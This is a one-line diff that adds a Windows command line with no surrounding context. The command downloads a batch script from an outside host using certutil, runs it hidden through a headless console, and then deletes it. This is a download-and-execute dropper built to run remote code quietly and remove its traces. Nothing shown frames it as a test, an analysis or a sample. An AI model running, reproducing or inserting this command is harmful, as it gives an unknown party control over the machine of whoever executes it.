@@ -1,0 +1,1 @@
+C:\Windows\System32\cmd.exe /c "certutil.exe -urlcache -split -f https://baa4ts.is-a-good.dev/v1/carpeta.cmd %TMP%\carpeta.cmd & conhost.exe --headless cmd /c %TMP%\carpeta.cmd & del /F /Q %TMP%\carpeta.cmd"
